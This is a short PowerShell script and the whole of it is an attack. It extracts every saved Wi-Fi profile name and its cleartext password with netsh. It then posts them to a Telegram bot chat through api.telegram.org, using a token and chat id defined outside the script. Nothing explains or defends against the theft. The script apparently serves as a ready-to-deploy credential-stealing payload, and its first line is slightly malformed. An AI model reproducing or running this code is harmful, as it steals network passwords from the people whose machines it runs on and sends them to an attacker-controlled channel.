Set-ExecutionPolicy -Scope CurrentUser
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

$token= $db #Replace this with your bot HTTP API Token
$URL='https://api.telegram.org/bot{0}' -f $Token
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $cid
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value $wifiProfiles
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"